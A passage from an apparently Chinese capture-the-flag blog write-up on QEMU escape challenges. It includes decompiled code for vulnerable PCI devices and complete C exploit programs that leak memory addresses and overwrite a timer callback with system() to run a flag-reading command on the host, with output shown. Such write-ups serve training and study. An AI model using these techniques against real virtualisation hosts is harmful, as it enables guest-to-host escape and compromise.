class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//write args</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x6d6f682f</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x7a772f65</span>);</span><br><span class="line">    mmio_write(<span class="number">20</span>,<span class="number">0x616c662f</span>);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">0x67</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    <span class="comment">//set priviledge</span></span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">"IO permission denied!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//leak libc</span></span><br><span class="line">	<span class="keyword">uint64_t</span> srandom_addr=pmio_abread(<span class="number">66</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    srandom_addr=srandom_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    srandom_addr+=pmio_abread(<span class="number">65</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]srandom addr: 0x%llx\n"</span>,srandom_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = srandom_addr - <span class="number">0x3a8d0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = libc_base + <span class="number">0x45390</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]libc base: 0x%llx\n"</span>,libc_base);</span><br><span class="line">    <span class="comment">//leak heap</span></span><br><span class="line">    <span class="keyword">uint32_t</span> heap_offset = (<span class="number">65</span>+<span class="number">7</span>*<span class="number">2</span>+<span class="number">1</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = pmio_abread(heap_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]heap addr: 0x%llx\n"</span>,heap_addr);</span><br><span class="line">    heap_addr = heap_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    heap_addr += pmio_abread((<span class="number">65</span>+<span class="number">7</span>*<span class="number">2</span>+<span class="number">2</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = heap_addr - <span class="number">615344</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]heap base: 0x%llx\n"</span>,heap_base);</span><br><span class="line">    <span class="comment">//get flag</span></span><br><span class="line">    pmio_abwrite(<span class="number">0x114</span>,system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0xc</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="湖湘杯2019-pwn2"><a href="#湖湘杯2019-pwn2" class="headerlink" title="湖湘杯2019 pwn2"></a>湖湘杯2019 pwn2</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>这道题基本就是刚才那道题改编的，当时在去重庆玩的火车上学长告诉我他调了一遍发现很简单，先膜一下学长orz。</p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><code>mmio_read</code>和<code>mmio_write</code>和之前相似，但是在结构体里不再有函数指针，新的结构体是下面这样的，最下面改成了一个QEMUTimer_0结构体，在read/write中调用的rand统统来自于<code>plt</code>，因此不能通过覆写函数指针的方式劫持控制流。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 STRNGState      struc ; (sizeof=0xC30, align=0x10, copyof_1439)</span></span><br><span class="line"><span class="comment">00000000 pdev            PCIDevice_0 ?</span></span><br><span class="line"><span class="comment">000008F0 mmio            MemoryRegion_0 ?</span></span><br><span class="line"><span class="comment">000009F0 pmio            MemoryRegion_0 ?</span></span><br><span class="line"><span class="comment">00000AF0 addr            dd ?</span></span><br><span class="line"><span class="comment">00000AF4 flag            dd ?</span></span><br><span class="line"><span class="comment">00000AF8 regs            dd 64 dup(?)</span></span><br><span class="line"><span class="comment">00000BF8 strng_timer     QEMUTimer_0 ?</span></span><br><span class="line"><span class="comment">00000C28                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C29                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2A                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2B                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2C                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2D                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2E                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2F                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C30 STRNGState      ends</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_508)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: IscsiTask/r</span></span><br><span class="line"><span class="comment">00000000                                         ; STRNGState/r</span></span><br><span class="line"><span class="comment">00000000 expire_time     dq ?</span></span><br><span class="line"><span class="comment">00000008 timer_list      dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000010 cb              dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000018 opaque          dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000020 next            dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000028 scale           dd ?</span></span><br><span class="line"><span class="comment">0000002C                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002D                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002E                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002F                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000030 QEMUTimer_0     ends</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> || addr &amp; <span class="number">3</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">uint32_t</span> saddr; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    saddr = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">        opaque-&gt;regs[saddr] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      opaque-&gt;flag = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;regs[saddr] = vala;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pmio_read</code>和<code>pmio_write</code>也差不多，但是在<code>pmio_write</code>的<code>i!=0/1/3</code>的<code>else</code>分支调用了<code>timer_mod(&amp;opaque-&gt;strng_timer, v4 + 100);</code>跟进去看发现最后有一个函数调用链。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  val = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;addr &amp; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    val = opaque-&gt;regs[opaque-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> saddr; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> &amp;&amp; !(opaque-&gt;addr &amp; <span class="number">3</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        saddr = opaque-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( saddr == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( saddr &lt; <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          srand(val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( saddr == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[saddr] = val;</span><br><span class="line">          <span class="keyword">if</span> ( opaque-&gt;flag )</span><br><span class="line">          &#123;</span><br><span class="line">            v4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;strng_timer, v4 + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个链是这样的：<code>timer_mod</code>-&gt;<code>timer_mod_ns</code>-&gt;<code>timerlist_rearm</code>-&gt;<code>timerlist_notify</code>-&gt;<code>(timer_list-&gt;notify_cb)(timer_list-&gt;notify_opaque);</code>，因为STRNGState后面跟了这个结构体，所以可以直接覆写其中的<code>cb</code>为<code>system@plt</code>，<code>opaque</code>为<code>cat /home/wz/flag</code>的地址，为了方便，我还是把它写到了<code>reg[2]</code>，然后泄露其地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">timer_mod</span><span class="params">(QEMUTimer_0 *ts, <span class="keyword">int64_t</span> expire_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  timer_mod_ns(ts, expire_time * ts-&gt;scale);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">timer_mod_ns</span><span class="params">(QEMUTimer_0 *ts, <span class="keyword">int64_t</span> expire_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">_Bool</span> rearm; <span class="comment">// ST17_1</span></span><br><span class="line">  QEMUTimerList_0 *timer_list; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  timer_list = ts-&gt;timer_list;</span><br><span class="line">  qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">  timer_del_locked(timer_list, ts);</span><br><span class="line">  rearm = timer_mod_ns_locked(timer_list, ts, expire_time);</span><br><span class="line">  qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">  <span class="keyword">if</span> ( rearm )</span><br><span class="line">    timerlist_rearm(timer_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">timerlist_rearm</span><span class="params">(QEMUTimerList_0 *timer_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( timer_list-&gt;clock-&gt;type == <span class="number">1</span> )</span><br><span class="line">    qemu_start_warp_timer();</span><br><span class="line">  timerlist_notify(timer_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">timerlist_notify</span><span class="params">(QEMUTimerList_0 *timer_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( timer_list-&gt;notify_cb )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *))timer_list-&gt;notify_cb)(timer_list-&gt;notify_opaque);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qemu_notify_event();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-c-1"><a href="#exp-c-1" class="headerlink" title="exp.c"></a>exp.c</h3><p>泄露地址拿gdb调下就好，这个里面没法ssh，所以exp需要打包到磁盘文件再从qemu启动本地读flag。打包命令为<code>find . | cpio -o --format=newc &gt; rootfs.cpio</code>，其他跟第一道题没什么区别，调试一下看看偏移就好</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc010</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_abread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//write args</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x6d6f682f</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x7a772f65</span>);</span><br><span class="line">    mmio_write(<span class="number">20</span>,<span class="number">0x616c662f</span>);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">0x67</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    <span class="comment">//set priviledge</span></span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">"IO permission denied!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//leak args/heap</span></span><br><span class="line">	<span class="keyword">uint64_t</span> heap_addr=pmio_abread((<span class="number">71</span> &lt;&lt; <span class="number">2</span>));</span><br><span class="line">    heap_addr=heap_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    heap_addr+=pmio_abread((<span class="number">70</span> &lt;&lt; <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">uint64_t</span> arg_addr = heap_addr + <span class="number">0xb00</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]arg addr: 0x%llx\n"</span>,arg_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> proc_addr = pmio_abread(<span class="number">69</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    proc_addr = proc_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    proc_addr += pmio_abread(<span class="number">68</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> proc_base = proc_addr - <span class="number">2731150</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]proc addr: 0x%llx\n"</span>,proc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = proc_base + <span class="number">0x200d50</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]system addr: 0x%llx\n"</span>,system_plt);</span><br><span class="line">    <span class="comment">//get flag</span></span><br><span class="line">    pmio_abwrite((<span class="number">70</span>&lt;&lt;<span class="number">2</span>),arg_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    pmio_abwrite((<span class="number">68</span>&lt;&lt;<span class="number">2</span>),system_plt &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Welcome to QEMU-ESCAPE</span><br><span class="line">qemu login: root</span><br><span class="line"><span class="comment"># cd /</span></span><br><span class="line"><span class="comment"># ./exp</span></span><br><span class="line">mmio_mem @ 0xf7762000</span><br><span class="line">[+]arg addr: 0x555558288570</span><br><span class="line">[+]proc addr: 0x555555554000</span><br><span class="line">[+]system addr: 0x555555754d50</span><br><span class="line"><span class="comment"># happy_new_year_2020!</span></span><br></pre></td></tr></table></figure>
<h2 id="数字经济线下RealWorld-Qemu-Escape"><a href="#数字经济线下RealWorld-Qemu-Escape" class="headerlink" title="数字经济线下RealWorld-Qemu-Escape"></a>数字经济线下RealWorld-Qemu-Escape</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>俩月前的比赛，当时自闭了两天，docker逃逸在<a href="https://ama2in9.top/2019/12/12/docker_escape/">这里</a>,browser的题在<a href="https://p1umer.github.io/2019/10/14/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Realworld-Browser-writeup/" target="_blank" rel="noopener">p1umer</a>和<a href="https://e3pem.github.io/2019/11/20/browser/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Browser/" target="_blank" rel="noopener">e3pem</a></p>
<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>在当时我对qemu一无所知的时候看到了<code>-device rfid</code>，但是去IDA搜相关函数没搜到就放弃了，实际上二进制文件去掉了符号表，增大了分析难度，之所以要增加这个难度，就是因为这个题太简单了，直接给了个后门。</p>
<p>下面一步步开始分析。</p>
<p>首先没有符号表，我们搜下<code>rfid</code>的字符串,根据之前的分析可以知道入口函数<code>rfid_class_init</code>里会有字符串<code>rfid_class_init</code>，所以根据引用可以找到<code>rfid_class_init</code>，里面那一堆是各种<code>id</code>，这个不必要再做区分，等会qemu里直接看设备基本就能对应上(或者找一个有符号表的qemu题按照偏移对照一下)</p>
<p><img src="/2020/09/03/strng/5.png" alt="rfid"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">rfid_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">"pci-device"</span>, <span class="string">"/home/wang/qemu/hw/misc/myrfid.c"</span>, <span class="number">0x171</span>LL, <span class="string">"rfid_class_init"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_rfid_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x420</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x1337</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x69</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在class_init里，一定要给个<code>realize</code>函数，所以这里唯一一个函数指针可以推断出是<code>pci_rfid_realize</code></p>
